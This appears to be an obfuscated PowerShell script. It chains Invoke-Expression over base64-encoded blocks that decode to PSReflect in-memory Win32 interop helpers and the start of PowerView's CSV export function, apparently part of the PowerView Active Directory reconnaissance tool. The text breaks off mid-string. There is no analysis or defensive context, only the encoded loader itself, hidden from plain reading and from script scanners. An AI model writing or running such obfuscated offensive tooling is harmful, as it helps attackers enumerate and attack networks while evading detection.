iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gTmV3LUluTWVtb3J5TW9kdWxlCnsKICAgIFBhcmFtCiAgICAoCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDApXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTW9kdWxlTmFtZSA9IFtHdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkKICAgICkKICAgICRMb2FkZWRBc3NlbWJsaWVzID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uR2V0QXNzZW1ibGllcygpCiAgICBGb3JFYWNoICgkQXNzZW1ibHkgaW4gJExvYWRlZEFzc2VtYmxpZXMpIHsKICAgICAgICBpZiAoJEFzc2VtYmx5LkZ1bGxOYW1lIC1hbmQgKCRBc3NlbWJseS5GdWxsTmFtZS5TcGxpdCgnLCcpWzBdIC1lcSAkTW9kdWxlTmFtZSkpIHsKICAgICAgICAgICAgcmV0dXJuICRBc3NlbWJseQogICAgICAgIH0KICAgIH0KICAgICREeW5Bc3NlbWJseSA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5Bc3NlbWJseU5hbWUoJE1vZHVsZU5hbWUpCiAgICAkRG9tYWluID0gW0FwcERvbWFpbl06OkN1cnJlbnREb21haW4KICAgICRBc3NlbWJseUJ1aWxkZXIgPSAkRG9tYWluLkRlZmluZUR5bmFtaWNBc3NlbWJseSgkRHluQXNzZW1ibHksICdSdW4nKQogICAgJE1vZHVsZUJ1aWxkZXIgPSAkQXNzZW1ibHlCdWlsZGVyLkRlZmluZUR5bmFtaWNNb2R1bGUoJE1vZHVsZU5hbWUsICRGYWxzZSkKICAgIHJldHVybiAkTW9kdWxlQnVpbGRlcgp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gZnVuYwp7CiAgICBQYXJhbQogICAgKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRGxsTmFtZSwKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEZ1bmN0aW9uTmFtZSwKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtUeXBlXQogICAgICAgICRSZXR1cm5UeXBlLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzKV0KICAgICAgICBbVHlwZVtdXQogICAgICAgICRQYXJhbWV0ZXJUeXBlcywKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCldCiAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNhbGxpbmdDb252ZW50aW9uXQogICAgICAgICROYXRpdmVDYWxsaW5nQ29udmVudGlvbiwKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNSldCiAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXRdCiAgICAgICAgJENoYXJzZXQsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU2V0TGFzdEVycm9yCiAgICApCiAgICAkUHJvcGVydGllcyA9IEB7CiAgICAgICAgRGxsTmFtZSA9ICREbGxOYW1lCiAgICAgICAgRnVuY3Rpb25OYW1lID0gJEZ1bmN0aW9uTmFtZQogICAgICAgIFJldHVyblR5cGUgPSAkUmV0dXJuVHlwZQogICAgfQogICAgaWYgKCRQYXJhbWV0ZXJUeXBlcykgeyAkUHJvcGVydGllc1snUGFyYW1ldGVyVHlwZXMnXSA9ICRQYXJhbWV0ZXJUeXBlcyB9CiAgICBpZiAoJE5hdGl2ZUNhbGxpbmdDb252ZW50aW9uKSB7ICRQcm9wZXJ0aWVzWydOYXRpdmVDYWxsaW5nQ29udmVudGlvbiddID0gJE5hdGl2ZUNhbGxpbmdDb252ZW50aW9uIH0KICAgIGlmICgkQ2hhcnNldCkgeyAkUHJvcGVydGllc1snQ2hhcnNldCddID0gJENoYXJzZXQgfQogICAgaWYgKCRTZXRMYXN0RXJyb3IpIHsgJFByb3BlcnRpZXNbJ1NldExhc3RFcnJvciddID0gJFNldExhc3RFcnJvciB9CiAgICBOZXctT2JqZWN0IFBTT2JqZWN0IC1Qcm9wZXJ0eSAkUHJvcGVydGllcwp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gQWRkLVdpbjMyVHlwZQp7CiAgICBbT3V0cHV0VHlwZShbSGFzaHRhYmxlXSldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERsbE5hbWUsCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdW5jdGlvbk5hbWUsCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbVHlwZV0KICAgICAgICAkUmV0dXJuVHlwZSwKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW1R5cGVbXV0KICAgICAgICAkUGFyYW1ldGVyVHlwZXMsCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DYWxsaW5nQ29udmVudGlvbl0KICAgICAgICAkTmF0aXZlQ2FsbGluZ0NvbnZlbnRpb24gPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2FsbGluZ0NvbnZlbnRpb25dOjpTdGRDYWxsLAogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2hhclNldF0KICAgICAgICAkQ2hhcnNldCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0XTo6QXV0bywKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU2V0TGFzdEVycm9yLAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZVNjcmlwdCh7KCRfIC1pcyBbUmVmbGVjdGlvbi5FbWl0Lk1vZHVsZUJ1aWxkZXJdKSAtb3IgKCRfIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pfSldCiAgICAgICAgJE1vZHVsZSwKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsKCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTmFtZXNwYWNlID0gJycKICAgICkKICAgIEJFR0lOCiAgICB7CiAgICAgICAgJFR5cGVIYXNoID0gQHt9CiAgICB9CiAgICBQUk9DRVNTCiAgICB7CiAgICAgICAgaWYgKCRNb2R1bGUgLWlzIFtSZWZsZWN0aW9uLkFzc2VtYmx5XSkKICAgICAgICB7CiAgICAgICAgICAgIGlmICgkTmFtZXNwYWNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkVHlwZUhhc2hbJERsbE5hbWVdID0gJE1vZHVsZS5HZXRUeXBlKCIkTmFtZXNwYWNlLiREbGxOYW1lIikKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRUeXBlSGFzaFskRGxsTmFtZV0gPSAkTW9kdWxlLkdldFR5cGUoJERsbE5hbWUpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCEkVHlwZUhhc2guQ29udGFpbnNLZXkoJERsbE5hbWUpKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJE5hbWVzcGFjZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkVHlwZUhhc2hbJERsbE5hbWVdID0gJE1vZHVsZS5EZWZpbmVUeXBlKCIkTmFtZXNwYWNlLiREbGxOYW1lIiwgJ1B1YmxpYyxCZWZvcmVGaWVsZEluaXQnKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRUeXBlSGFzaFskRGxsTmFtZV0gPSAkTW9kdWxlLkRlZmluZVR5cGUoJERsbE5hbWUsICdQdWJsaWMsQmVmb3JlRmllbGRJbml0JykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAkTWV0aG9kID0gJFR5cGVIYXNoWyREbGxOYW1lXS5EZWZpbmVNZXRob2QoCiAgICAgICAgICAgICAgICAkRnVuY3Rpb25OYW1lLAogICAgICAgICAgICAgICAgJ1B1YmxpYyxTdGF0aWMsUGludm9rZUltcGwnLAogICAgICAgICAgICAgICAgJFJldHVyblR5cGUsCiAgICAgICAgICAgICAgICAkUGFyYW1ldGVyVHlwZXMpCiAgICAgICAgICAgICRpID0gMQogICAgICAgICAgICBGb3JFYWNoKCRQYXJhbWV0ZXIgaW4gJFBhcmFtZXRlclR5cGVzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFBhcmFtZXRlci5Jc0J5UmVmKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFt2b2lkXSAkTWV0aG9kLkRlZmluZVBhcmFtZXRlcigkaSwgJ091dCcsICROdWxsKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGkrKwogICAgICAgICAgICB9CiAgICAgICAgICAgICREbGxJbXBvcnQgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0QXR0cmlidXRlXQogICAgICAgICAgICAkU2V0TGFzdEVycm9yRmllbGQgPSAkRGxsSW1wb3J0LkdldEZpZWxkKCdTZXRMYXN0RXJyb3InKQogICAgICAgICAgICAkQ2FsbGluZ0NvbnZlbnRpb25GaWVsZCA9ICREbGxJbXBvcnQuR2V0RmllbGQoJ0NhbGxpbmdDb252ZW50aW9uJykKICAgICAgICAgICAgJENoYXJzZXRGaWVsZCA9ICREbGxJbXBvcnQuR2V0RmllbGQoJ0NoYXJTZXQnKQogICAgICAgICAgICBpZiAoJFNldExhc3RFcnJvcikgeyAkU0xFVmFsdWUgPSAkVHJ1ZSB9IGVsc2UgeyAkU0xFVmFsdWUgPSAkRmFsc2UgfQogICAgICAgICAgICAkQ29uc3RydWN0b3IgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0QXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcihbU3RyaW5nXSkKICAgICAgICAgICAgJERsbEltcG9ydEF0dHJpYnV0ZSA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9yLAogICAgICAgICAgICAgICAgJERsbE5hbWUsIFtSZWZsZWN0aW9uLlByb3BlcnR5SW5mb1tdXSBAKCksIFtPYmplY3RbXV0gQCgpLAogICAgICAgICAgICAgICAgW1JlZmxlY3Rpb24uRmllbGRJbmZvW11dIEAoJFNldExhc3RFcnJvckZpZWxkLCAkQ2FsbGluZ0NvbnZlbnRpb25GaWVsZCwgJENoYXJzZXRGaWVsZCksCiAgICAgICAgICAgICAgICBbT2JqZWN0W11dIEAoJFNMRVZhbHVlLCAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNhbGxpbmdDb252ZW50aW9uXSAkTmF0aXZlQ2FsbGluZ0NvbnZlbnRpb24pLCAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNoYXJTZXRdICRDaGFyc2V0KSkpCiAgICAgICAgICAgICRNZXRob2QuU2V0Q3VzdG9tQXR0cmlidXRlKCREbGxJbXBvcnRBdHRyaWJ1dGUpCiAgICAgICAgfQogICAgfQogICAgRU5ECiAgICB7CiAgICAgICAgaWYgKCRNb2R1bGUgLWlzIFtSZWZsZWN0aW9uLkFzc2VtYmx5XSkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiAkVHlwZUhhc2gKICAgICAgICB9CiAgICAgICAgJFJldHVyblR5cGVzID0gQHt9CiAgICAgICAgRm9yRWFjaCAoJEtleSBpbiAkVHlwZUhhc2guS2V5cykKICAgICAgICB7CiAgICAgICAgICAgICRUeXBlID0gJFR5cGVIYXNoWyRLZXldLkNyZWF0ZVR5cGUoKQogICAgICAgICAgICAkUmV0dXJuVHlwZXNbJEtleV0gPSAkVHlwZQogICAgICAgIH0KICAgICAgICByZXR1cm4gJFJldHVyblR5cGVzCiAgICB9Cn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gcHNlbnVtCnsKICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldCiAgICBQYXJhbQogICAgKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHsoJF8gLWlzIFtSZWZsZWN0aW9uLkVtaXQuTW9kdWxlQnVpbGRlcl0pIC1vciAoJF8gLWlzIFtSZWZsZWN0aW9uLkFzc2VtYmx5XSl9KV0KICAgICAgICAkTW9kdWxlLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdWxsTmFtZSwKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtUeXBlXQogICAgICAgICRUeXBlLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAzLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbSGFzaHRhYmxlXQogICAgICAgICRFbnVtRWxlbWVudHMsCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQml0ZmllbGQKICAgICkKICAgIGlmICgkTW9kdWxlIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pCiAgICB7CiAgICAgICAgcmV0dXJuICgkTW9kdWxlLkdldFR5cGUoJEZ1bGxOYW1lKSkKICAgIH0KICAgICRFbnVtVHlwZSA9ICRUeXBlIC1hcyBbVHlwZV0KICAgICRFbnVtQnVpbGRlciA9ICRNb2R1bGUuRGVmaW5lRW51bSgkRnVsbE5hbWUsICdQdWJsaWMnLCAkRW51bVR5cGUpCiAgICBpZiAoJEJpdGZpZWxkKQogICAgewogICAgICAgICRGbGFnc0NvbnN0cnVjdG9yID0gW0ZsYWdzQXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcihAKCkpCiAgICAgICAgJEZsYWdzQ3VzdG9tQXR0cmlidXRlID0gTmV3LU9iamVjdCBSZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkRmxhZ3NDb25zdHJ1Y3RvciwgQCgpKQogICAgICAgICRFbnVtQnVpbGRlci5TZXRDdXN0b21BdHRyaWJ1dGUoJEZsYWdzQ3VzdG9tQXR0cmlidXRlKQogICAgfQogICAgRm9yRWFjaCAoJEtleSBpbiAkRW51bUVsZW1lbnRzLktleXMpCiAgICB7CiAgICAgICAgJE51bGwgPSAkRW51bUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgkS2V5LCAkRW51bUVsZW1lbnRzWyRLZXldIC1hcyAkRW51bVR5cGUpCiAgICB9CiAgICAkRW51bUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCn0K")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gZmllbGQKewogICAgUGFyYW0KICAgICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtVSW50MTZdCiAgICAgICAgJFBvc2l0aW9uLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1R5cGVdCiAgICAgICAgJFR5cGUsCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIpXQogICAgICAgIFtVSW50MTZdCiAgICAgICAgJE9mZnNldCwKICAgICAgICBbT2JqZWN0W11dCiAgICAgICAgJE1hcnNoYWxBcwogICAgKQogICAgQHsKICAgICAgICBQb3NpdGlvbiA9ICRQb3NpdGlvbgogICAgICAgIFR5cGUgPSAkVHlwZSAtYXMgW1R5cGVdCiAgICAgICAgT2Zmc2V0ID0gJE9mZnNldAogICAgICAgIE1hcnNoYWxBcyA9ICRNYXJzaGFsQXMKICAgIH0KfQo=")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gc3RydWN0CnsKICAgIFtPdXRwdXRUeXBlKFtUeXBlXSldCiAgICBQYXJhbQogICAgKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlU2NyaXB0KHsoJF8gLWlzIFtSZWZsZWN0aW9uLkVtaXQuTW9kdWxlQnVpbGRlcl0pIC1vciAoJF8gLWlzIFtSZWZsZWN0aW9uLkFzc2VtYmx5XSl9KV0KICAgICAgICAkTW9kdWxlLAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnkgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRGdWxsTmFtZSwKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0hhc2h0YWJsZV0KICAgICAgICAkU3RydWN0RmllbGRzLAogICAgICAgIFtSZWZsZWN0aW9uLkVtaXQuUGFja2luZ1NpemVdCiAgICAgICAgJFBhY2tpbmdTaXplID0gW1JlZmxlY3Rpb24uRW1pdC5QYWNraW5nU2l6ZV06OlVuc3BlY2lmaWVkLAogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJEV4cGxpY2l0TGF5b3V0CiAgICApCiAgICBpZiAoJE1vZHVsZSAtaXMgW1JlZmxlY3Rpb24uQXNzZW1ibHldKQogICAgewogICAgICAgIHJldHVybiAoJE1vZHVsZS5HZXRUeXBlKCRGdWxsTmFtZSkpCiAgICB9CiAgICBbUmVmbGVjdGlvbi5UeXBlQXR0cmlidXRlc10gJFN0cnVjdEF0dHJpYnV0ZXMgPSAnQW5zaUNsYXNzLAogICAgICAgIENsYXNzLAogICAgICAgIFB1YmxpYywKICAgICAgICBTZWFsZWQsCiAgICAgICAgQmVmb3JlRmllbGRJbml0JwogICAgaWYgKCRFeHBsaWNpdExheW91dCkKICAgIHsKICAgICAgICAkU3RydWN0QXR0cmlidXRlcyA9ICRTdHJ1Y3RBdHRyaWJ1dGVzIC1ib3IgW1JlZmxlY3Rpb24uVHlwZUF0dHJpYnV0ZXNdOjpFeHBsaWNpdExheW91dAogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRTdHJ1Y3RBdHRyaWJ1dGVzID0gJFN0cnVjdEF0dHJpYnV0ZXMgLWJvciBbUmVmbGVjdGlvbi5UeXBlQXR0cmlidXRlc106OlNlcXVlbnRpYWxMYXlvdXQKICAgIH0KICAgICRTdHJ1Y3RCdWlsZGVyID0gJE1vZHVsZS5EZWZpbmVUeXBlKCRGdWxsTmFtZSwgJFN0cnVjdEF0dHJpYnV0ZXMsIFtWYWx1ZVR5cGVdLCAkUGFja2luZ1NpemUpCiAgICAkQ29uc3RydWN0b3JJbmZvID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxBc0F0dHJpYnV0ZV0uR2V0Q29uc3RydWN0b3JzKClbMF0KICAgICRTaXplQ29uc3QgPSBAKFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsQXNBdHRyaWJ1dGVdLkdldEZpZWxkKCdTaXplQ29uc3QnKSkKICAgICRGaWVsZHMgPSBOZXctT2JqZWN0IEhhc2h0YWJsZVtdKCRTdHJ1Y3RGaWVsZHMuQ291bnQpCiAgICBGb3JFYWNoICgkRmllbGQgaW4gJFN0cnVjdEZpZWxkcy5LZXlzKQogICAgewogICAgICAgICRJbmRleCA9ICRTdHJ1Y3RGaWVsZHNbJEZpZWxkXVsnUG9zaXRpb24nXQogICAgICAgICRGaWVsZHNbJEluZGV4XSA9IEB7RmllbGROYW1lID0gJEZpZWxkOyBQcm9wZXJ0aWVzID0gJFN0cnVjdEZpZWxkc1skRmllbGRdfQogICAgfQogICAgRm9yRWFjaCAoJEZpZWxkIGluICRGaWVsZHMpCiAgICB7CiAgICAgICAgJEZpZWxkTmFtZSA9ICRGaWVsZFsnRmllbGROYW1lJ10KICAgICAgICAkRmllbGRQcm9wID0gJEZpZWxkWydQcm9wZXJ0aWVzJ10KICAgICAgICAkT2Zmc2V0ID0gJEZpZWxkUHJvcFsnT2Zmc2V0J10KICAgICAgICAkVHlwZSA9ICRGaWVsZFByb3BbJ1R5cGUnXQogICAgICAgICRNYXJzaGFsQXMgPSAkRmllbGRQcm9wWydNYXJzaGFsQXMnXQogICAgICAgICROZXdGaWVsZCA9ICRTdHJ1Y3RCdWlsZGVyLkRlZmluZUZpZWxkKCRGaWVsZE5hbWUsICRUeXBlLCAnUHVibGljJykKICAgICAgICBpZiAoJE1hcnNoYWxBcykKICAgICAgICB7CiAgICAgICAgICAgICRVbm1hbmFnZWRUeXBlID0gJE1hcnNoYWxBc1swXSAtYXMgKFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5Vbm1hbmFnZWRUeXBlXSkKICAgICAgICAgICAgaWYgKCRNYXJzaGFsQXNbMV0pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRTaXplID0gJE1hcnNoYWxBc1sxXQogICAgICAgICAgICAgICAgJEF0dHJpYkJ1aWxkZXIgPSBOZXctT2JqZWN0IFJlZmxlY3Rpb24uRW1pdC5DdXN0b21BdHRyaWJ1dGVCdWlsZGVyKCRDb25zdHJ1Y3RvckluZm8sCiAgICAgICAgICAgICAgICAgICAgJFVubWFuYWdlZFR5cGUsICRTaXplQ29uc3QsIEAoJFNpemUpKQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEF0dHJpYkJ1aWxkZXIgPSBOZXctT2JqZWN0IFJlZmxlY3Rpb24uRW1pdC5DdXN0b21BdHRyaWJ1dGVCdWlsZGVyKCRDb25zdHJ1Y3RvckluZm8sIFtPYmplY3RbXV0gQCgkVW5tYW5hZ2VkVHlwZSkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE5ld0ZpZWxkLlNldEN1c3RvbUF0dHJpYnV0ZSgkQXR0cmliQnVpbGRlcikKICAgICAgICB9CiAgICAgICAgaWYgKCRFeHBsaWNpdExheW91dCkgeyAkTmV3RmllbGQuU2V0T2Zmc2V0KCRPZmZzZXQpIH0KICAgIH0KICAgICRTaXplTWV0aG9kID0gJFN0cnVjdEJ1aWxkZXIuRGVmaW5lTWV0aG9kKCdHZXRTaXplJywKICAgICAgICAnUHVibGljLCBTdGF0aWMnLAogICAgICAgIFtJbnRdLAogICAgICAgIFtUeXBlW11dIEAoKSkKICAgICRJTEdlbmVyYXRvciA9ICRTaXplTWV0aG9kLkdldElMR2VuZXJhdG9yKCkKICAgICRJTEdlbmVyYXRvci5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OkxkdG9rZW4sICRTdHJ1Y3RCdWlsZGVyKQogICAgJElMR2VuZXJhdG9yLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Q2FsbCwKICAgICAgICBbVHlwZV0uR2V0TWV0aG9kKCdHZXRUeXBlRnJvbUhhbmRsZScpKQogICAgJElMR2VuZXJhdG9yLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Q2FsbCwKICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF0uR2V0TWV0aG9kKCdTaXplT2YnLCBbVHlwZVtdXSBAKFtUeXBlXSkpKQogICAgJElMR2VuZXJhdG9yLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6UmV0KQogICAgJEltcGxpY2l0Q29udmVydGVyID0gJFN0cnVjdEJ1aWxkZXIuRGVmaW5lTWV0aG9kKCdvcF9JbXBsaWNpdCcsCiAgICAgICAgJ1ByaXZhdGVTY29wZSwgUHVibGljLCBTdGF0aWMsIEhpZGVCeVNpZywgU3BlY2lhbE5hbWUnLAogICAgICAgICRTdHJ1Y3RCdWlsZGVyLAogICAgICAgIFtUeXBlW11dIEAoW0ludFB0cl0pKQogICAgJElMR2VuZXJhdG9yMiA9ICRJbXBsaWNpdENvbnZlcnRlci5HZXRJTEdlbmVyYXRvcigpCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Tm9wKQogICAgJElMR2VuZXJhdG9yMi5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OkxkYXJnXzApCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6TGR0b2tlbiwgJFN0cnVjdEJ1aWxkZXIpCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Q2FsbCwKICAgICAgICBbVHlwZV0uR2V0TWV0aG9kKCdHZXRUeXBlRnJvbUhhbmRsZScpKQogICAgJElMR2VuZXJhdG9yMi5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OkNhbGwsCiAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdLkdldE1ldGhvZCgnUHRyVG9TdHJ1Y3R1cmUnLCBbVHlwZVtdXSBAKFtJbnRQdHJdLCBbVHlwZV0pKSkKICAgICRJTEdlbmVyYXRvcjIuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpVbmJveF9BbnksICRTdHJ1Y3RCdWlsZGVyKQogICAgJElMR2VuZXJhdG9yMi5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OlJldCkKICAgICRTdHJ1Y3RCdWlsZGVyLkNyZWF0ZVR5cGUoKQp9Cg==")))iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gRXhwb3J0LVBvd2VyVmlld0NTViB7CiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmU9JFRydWUsCiAgICAgICAgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZT0kVHJ1ZSldCiAgICAgICAgW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3RdCiAgICAgICAgJElucHV0T2JqZWN0LAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlLCBQb3NpdGlvbj0wKV0KICAgICAgICBbQWxpYXMoJ1BTUGF0aCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE91dEZpbGUKICAgICkKICAgIHByb2Nlc3MgewogICAgICAgICRPYmplY3RDU1YgPSAkSW5wdXRPYmplY3QgfCBDb252ZXJ0VG8tQ3N2IC1Ob1R5cGVJbmZvcm1hdGlvbgogICAgICAgICRNdXRleCA9IE5ldy1PYmplY3QgU3lzdGVtLlRocmVhZGluZy5NdXRleCAkRmFsc2UsJ0NTVk11dGV4JzsKICAgICAgICAkTnVsbCA9ICRNdXRleC5XYWl0T25lKCkKICAgICAgICBpZiAoVGVzdC1QYXRoIC1QYXRoICRPdXRGaWxlKSB7CiAgICAgICAgICAgICRPYmplY3RDU1YgfCBGb3JlYWNoLU9iamVjdCB